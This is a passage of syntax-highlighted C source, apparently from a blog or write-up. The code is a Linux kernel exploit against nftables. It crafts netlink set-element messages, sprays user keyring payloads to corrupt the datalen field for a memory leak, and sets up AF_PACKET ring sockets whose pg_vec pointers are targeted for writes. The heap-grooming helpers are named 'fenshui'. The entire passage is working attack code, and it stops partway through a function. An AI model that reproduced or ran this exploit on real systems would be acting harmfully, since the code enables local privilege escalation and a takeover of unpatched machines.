</span></span><span style=display:flex><span>  nlh_batch_begin <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_begin_nlmsghdr</span>();
</span></span><span style=display:flex><span>  nlh_batch_end <span style=color:#666>=</span> <span style=color:#06287e>make_bacth_end_nlmsghdr</span>();
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(iov, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(iov));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Precompute the size of the nested field **/</span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** First element ***/</span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);              <span style=color:#60a0b0;font-style:italic>// Englobing attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);              <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_KEY
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen);           <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VALUE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);              <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_DATA
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#06287e>NLA_ALIGN</span>(<span style=color:#06287e>NLA_BIN_SIZE</span>(data_len));  <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VALUE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  first_element_size <span style=color:#666>=</span> nested_attr_size;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** Second element ***/</span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);     <span style=color:#60a0b0;font-style:italic>// Englobing attribute
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);     <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_KEY
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen);  <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VALUE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);  <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_DATA
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);  <span style=color:#60a0b0;font-style:italic>// NFTA_DATA_VERDICT
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nested_attr_size <span style=color:#666>+=</span> U32_NLA_SIZE;           <span style=color:#60a0b0;font-style:italic>// NFTA_VERDICT_CODE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  second_element_size <span style=color:#666>=</span> nested_attr_size <span style=color:#666>-</span> first_element_size;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_payload_size <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg);  <span style=color:#60a0b0;font-style:italic>// Mandatory
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr);   <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_ELEMENTS
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> nested_attr_size;        <span style=color:#60a0b0;font-style:italic>// All the stuff described above
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> S8_NLA_SIZE;             <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_TABLE
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> S8_NLA_SIZE;             <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_SET
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>+=</span> U32_NLA_SIZE;            <span style=color:#60a0b0;font-style:italic>// NFTA_SET_ELEM_LIST_SET_ID
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  nlh_payload_size <span style=color:#666>=</span> <span style=color:#06287e>NLMSG_SPACE</span>(nlh_payload_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Allocation **/</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nlh_payload <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlmsghdr <span style=color:#666>*</span>)<span style=color:#06287e>malloc</span>(nlh_payload_size);
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (nlh_payload <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] oom</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(nlh_payload, <span style=color:#40a070>0</span>, nlh_payload_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Fill the required fields **/</span>
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len <span style=color:#666>=</span> nlh_payload_size;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_type <span style=color:#666>=</span> (NFNL_SUBSYS_NFTABLES <span style=color:#666>&lt;&lt;</span> <span style=color:#40a070>8</span>) <span style=color:#666>|</span> NFT_MSG_NEWSETELEM;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_pid <span style=color:#666>=</span> <span style=color:#06287e>getpid</span>();
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_flags <span style=color:#666>=</span> NLM_F_REQUEST;
</span></span><span style=display:flex><span>  nlh_payload<span style=color:#666>-&gt;</span>nlmsg_seq <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  nfgm <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nfgenmsg <span style=color:#666>*</span>)<span style=color:#06287e>NLMSG_DATA</span>(nlh_payload);
</span></span><span style=display:flex><span>  nfgm<span style=color:#666>-&gt;</span>nfgen_family <span style=color:#666>=</span> NFPROTO_INET;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/** Setup the attributes */</span>
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> (<span style=color:#007020;font-weight:700>struct</span> nlattr <span style=color:#666>*</span>)((<span style=color:#902000>void</span> <span style=color:#666>*</span>)nlh_payload <span style=color:#666>+</span>
</span></span><span style=display:flex><span>                           <span style=color:#06287e>NLMSG_SPACE</span>(<span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nfgenmsg)));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(attr, NFTA_SET_ELEM_LIST_TABLE, table_name);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_str8_attr</span>(attr, NFTA_SET_ELEM_LIST_SET, set_name);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_u32_attr</span>(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_LIST_ELEMENTS, nested_attr_size);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** First element ***/</span>
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, <span style=color:#40a070>0</span>, first_element_size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_KEY, <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)zerobuf, set_keylen);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_DATA, <span style=color:#06287e>NLA_BIN_SIZE</span>(data_len));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)data, data_len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#60a0b0;font-style:italic>/*** Second element ***/</span>
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, <span style=color:#40a070>0</span>, second_element_size <span style=color:#666>-</span> <span style=color:#40a070>4</span>);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_KEY, <span style=color:#06287e>NLA_BIN_SIZE</span>(set_keylen));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_binary_attr</span>(attr, NFTA_DATA_VALUE, (<span style=color:#902000>uint8_t</span> <span style=color:#666>*</span>)zerobuf, set_keylen);
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_SET_ELEM_DATA,
</span></span><span style=display:flex><span>                         U32_NLA_SIZE <span style=color:#666>+</span> <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#007020;font-weight:700>struct</span> nlattr));
</span></span><span style=display:flex><span>  attr <span style=color:#666>=</span> <span style=color:#06287e>set_nested_attr</span>(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
</span></span><span style=display:flex><span>  <span style=color:#06287e>set_u32_attr</span>(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_base <span style=color:#666>=</span> nlh_batch_begin;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>0</span>].iov_len <span style=color:#666>=</span> nlh_batch_begin<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_base <span style=color:#666>=</span> nlh_payload;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>1</span>].iov_len <span style=color:#666>=</span> nlh_payload<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_base <span style=color:#666>=</span> nlh_batch_end;
</span></span><span style=display:flex><span>  iov[<span style=color:#40a070>2</span>].iov_len <span style=color:#666>=</span> nlh_batch_end<span style=color:#666>-&gt;</span>nlmsg_len;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  msg.msg_name <span style=color:#666>=</span> <span style=color:#666>&amp;</span>dest_nl;
</span></span><span style=display:flex><span>  msg.msg_namelen <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>sizeof</span>(dest_nl);
</span></span><span style=display:flex><span>  msg.msg_iov <span style=color:#666>=</span> iov;
</span></span><span style=display:flex><span>  msg.msg_iovlen <span style=color:#666>=</span> <span style=color:#40a070>3</span>;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> nbytes;
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> ((nbytes <span style=color:#666>=</span> <span style=color:#06287e>sendmsg</span>(nlsock, <span style=color:#666>&amp;</span>msg, <span style=color:#40a070>0</span>)) <span style=color:#666>&lt;=</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] sendmsg(create set)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>close</span>(nlsock);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#06287e>printf</span>(<span style=color:#4070a0>&#34;[!] %d bytes sent</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>, nbytes);
</span></span><span style=display:flex><span>  <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;    sendmsg&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_begin);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_payload);
</span></span><span style=display:flex><span>  <span style=color:#06287e>free</span>(nlh_batch_end);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span>;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#007020>#define TABLENAME &#34;exptblaa&#34;
</span></span></span><span style=display:flex><span><span style=color:#007020>#define LEAK_SET_NAME &#34;expsetaa&#34;
</span></span></span><span style=display:flex><span><span style=color:#007020>#define WRITE_SET_NAME &#34;expsetbb&#34;
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// keyring
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// we use user key type
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// struct user_key_payload {
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// 	struct rcu_head	rcu;		/* RCU destructor */
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// 	unsigned short	datalen;	/* length of this data */
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// 	char		data[] __aligned(__alignof__(u64)); /* actual data */
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// };
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// header size: 0x18
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>
</span></span><span style=display:flex><span><span style=color:#007020>#define PREFIX_BUF_LEN 16
</span></span></span><span style=display:flex><span><span style=color:#007020>#define RCU_HEAD_LEN 16
</span></span></span><span style=display:flex><span><span style=color:#007020></span><span style=color:#007020;font-weight:700>struct</span> keyring_payload {
</span></span><span style=display:flex><span>  <span style=color:#902000>uint8_t</span> prefix[PREFIX_BUF_LEN];  <span style=color:#60a0b0;font-style:italic>// pad - not overflowed
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>uint8_t</span> rcu_buf[RCU_HEAD_LEN];   <span style=color:#60a0b0;font-style:italic>// pad - user_key_payload-&gt;rcu
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>unsigned</span> <span style=color:#902000>short</span> len;              <span style=color:#60a0b0;font-style:italic>// user_key_payload-&gt;datalen
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>struct</span> pg_vec_write_payload {
</span></span><span style=display:flex><span>  <span style=color:#902000>uint8_t</span> prefix[PREFIX_BUF_LEN];  <span style=color:#60a0b0;font-style:italic>// pad - not overflowed
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>uint64_t</span> buff[<span style=color:#40a070>5</span>];                <span style=color:#60a0b0;font-style:italic>// pg_vec[]
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>};
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>key_serial_t</span> <span style=color:#06287e>key_alloc</span>(<span style=color:#902000>char</span> <span style=color:#666>*</span>description, <span style=color:#902000>char</span> <span style=color:#666>*</span>payload, <span style=color:#902000>int</span> payload_len) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>syscall</span>(__NR_add_key, <span style=color:#4070a0>&#34;user&#34;</span>, description, payload, payload_len,
</span></span><span style=display:flex><span>                 KEY_SPEC_PROCESS_KEYRING);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>key_update</span>(<span style=color:#902000>key_serial_t</span> keyid, <span style=color:#902000>char</span> <span style=color:#666>*</span>payload, <span style=color:#902000>size_t</span> plen) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>syscall</span>(__NR_keyctl, KEYCTL_UPDATE, keyid, payload, plen);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>key_read</span>(<span style=color:#902000>key_serial_t</span> keyid, <span style=color:#902000>char</span> <span style=color:#666>*</span>buffer, <span style=color:#902000>size_t</span> buflen) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>syscall</span>(__NR_keyctl, KEYCTL_READ, keyid, buffer, buflen);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>key_revoke</span>(<span style=color:#902000>key_serial_t</span> keyid) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>syscall</span>(__NR_keyctl, KEYCTL_REVOKE, keyid, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>, <span style=color:#40a070>0</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>key_unlink</span>(<span style=color:#902000>key_serial_t</span> keyid) {
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> <span style=color:#06287e>syscall</span>(__NR_keyctl, KEYCTL_UNLINK, keyid, KEY_SPEC_PROCESS_KEYRING);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>#define MAX_KEYS 200
</span></span></span><span style=display:flex><span><span style=color:#007020>#define N_SPRAY_KEYRING (MAX_KEYS / 2)
</span></span></span><span style=display:flex><span><span style=color:#007020>#define N_FENSHUI_KEYRING (MAX_KEYS / 4)
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>key_serial_t</span> <span style=color:#666>*</span><span style=color:#06287e>spray_keyring</span>(<span style=color:#902000>int</span> n_spray) {
</span></span><span style=display:flex><span>  <span style=color:#902000>char</span> key_desc[<span style=color:#40a070>0x20</span>] <span style=color:#666>=</span>
</span></span><span style=display:flex><span>      {};  <span style=color:#60a0b0;font-style:italic>// max 0x20 because i don&#39;t want it tanit kmalloc-64
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>  <span style=color:#902000>key_serial_t</span> <span style=color:#666>*</span>ids <span style=color:#666>=</span> <span style=color:#06287e>calloc</span>(n_spray, <span style=color:#007020;font-weight:700>sizeof</span>(<span style=color:#902000>key_serial_t</span>));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (ids <span style=color:#666>==</span> <span style=color:#007020>NULL</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>fprintf</span>(stderr, <span style=color:#4070a0>&#34;[-] oom</span><span style=color:#4070a0;font-weight:700>\n</span><span style=color:#4070a0>&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>return</span> <span style=color:#007020>NULL</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>for</span> (<span style=color:#902000>int</span> i <span style=color:#666>=</span> <span style=color:#40a070>0</span>; i <span style=color:#666>&lt;</span> n_spray; i<span style=color:#666>++</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>snprintf</span>(key_desc, <span style=color:#007020;font-weight:700>sizeof</span>(key_desc), <span style=color:#4070a0>&#34;AAAAAAAA</span><span style=color:#4070a0;font-weight:700>\xAA</span><span style=color:#4070a0>%03d&#34;</span>, i);  <span style=color:#60a0b0;font-style:italic>// 24 + 8 + 4
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span>    ids[i] <span style=color:#666>=</span> <span style=color:#06287e>key_alloc</span>(key_desc, key_desc, <span style=color:#06287e>strlen</span>(key_desc));
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>if</span> (ids[i] <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>      <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] __NR_add_key&#34;</span>);
</span></span><span style=display:flex><span>      <span style=color:#06287e>exit</span>(<span style=color:#40a070>2</span>);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> ids;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>// packet socket
</span></span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic></span><span style=color:#007020>#define N_SPRAY_PACKET_SOCK 0x200
</span></span></span><span style=display:flex><span><span style=color:#007020>#define N_SPARY_PACKET_SOCK_HOLE 0x10
</span></span></span><span style=display:flex><span><span style=color:#007020>#define N_SPRAY_FENSHUI_PACKET_SOCK (N_SPRAY_PACKET_SOCK / 2)
</span></span></span><span style=display:flex><span><span style=color:#007020></span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>packet_socket_setup</span>(<span style=color:#902000>uint32_t</span> block_size, <span style=color:#902000>uint32_t</span> frame_size,
</span></span><span style=display:flex><span>                        <span style=color:#902000>uint32_t</span> block_nr, <span style=color:#902000>uint32_t</span> sizeof_priv, <span style=color:#902000>int</span> timeout) {
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> s <span style=color:#666>=</span> <span style=color:#06287e>socket</span>(AF_PACKET, SOCK_RAW, <span style=color:#06287e>htons</span>(ETH_P_ALL));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (s <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] socket (AF_PACKET)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> v <span style=color:#666>=</span> TPACKET_V3;
</span></span><span style=display:flex><span>  <span style=color:#902000>int</span> rv <span style=color:#666>=</span> <span style=color:#06287e>setsockopt</span>(s, SOL_PACKET, PACKET_VERSION, <span style=color:#666>&amp;</span>v, <span style=color:#007020;font-weight:700>sizeof</span>(v));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (rv <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] setsockopt (PACKET_VERSION)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> tpacket_req3 req3;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>req3, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(req3));
</span></span><span style=display:flex><span>  req3.tp_sizeof_priv <span style=color:#666>=</span> sizeof_priv;
</span></span><span style=display:flex><span>  req3.tp_block_nr <span style=color:#666>=</span> block_nr;
</span></span><span style=display:flex><span>  req3.tp_block_size <span style=color:#666>=</span> block_size;
</span></span><span style=display:flex><span>  req3.tp_frame_size <span style=color:#666>=</span> frame_size;
</span></span><span style=display:flex><span>  req3.tp_frame_nr <span style=color:#666>=</span> (block_size <span style=color:#666>*</span> block_nr) <span style=color:#666>/</span> frame_size;
</span></span><span style=display:flex><span>  req3.tp_retire_blk_tov <span style=color:#666>=</span> timeout;
</span></span><span style=display:flex><span>  req3.tp_feature_req_word <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  rv <span style=color:#666>=</span> <span style=color:#06287e>setsockopt</span>(s, SOL_PACKET, PACKET_RX_RING, <span style=color:#666>&amp;</span>req3, <span style=color:#007020;font-weight:700>sizeof</span>(req3));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (rv <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] setsockopt (PACKET_RX_RING)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>struct</span> sockaddr_ll sa;
</span></span><span style=display:flex><span>  <span style=color:#06287e>memset</span>(<span style=color:#666>&amp;</span>sa, <span style=color:#40a070>0</span>, <span style=color:#007020;font-weight:700>sizeof</span>(sa));
</span></span><span style=display:flex><span>  sa.sll_family <span style=color:#666>=</span> PF_PACKET;
</span></span><span style=display:flex><span>  sa.sll_protocol <span style=color:#666>=</span> <span style=color:#06287e>htons</span>(ETH_P_ALL);
</span></span><span style=display:flex><span>  sa.sll_ifindex <span style=color:#666>=</span> <span style=color:#06287e>if_nametoindex</span>(<span style=color:#4070a0>&#34;lo&#34;</span>);
</span></span><span style=display:flex><span>  sa.sll_hatype <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  sa.sll_halen <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  sa.sll_pkttype <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>  sa.sll_halen <span style=color:#666>=</span> <span style=color:#40a070>0</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  rv <span style=color:#666>=</span> <span style=color:#06287e>bind</span>(s, (<span style=color:#007020;font-weight:700>struct</span> sockaddr <span style=color:#666>*</span>)<span style=color:#666>&amp;</span>sa, <span style=color:#007020;font-weight:700>sizeof</span>(sa));
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>if</span> (rv <span style=color:#666>&lt;</span> <span style=color:#40a070>0</span>) {
</span></span><span style=display:flex><span>    <span style=color:#06287e>perror</span>(<span style=color:#4070a0>&#34;[-] bind (AF_PACKET)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#06287e>exit</span>(<span style=color:#40a070>1</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#007020;font-weight:700>return</span> s;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#902000>int</span> <span style=color:#06287e>pagealloc_pad</span>(<span style=color:#902000>int</span> count, <span style=color:#902000>int</span> size) {
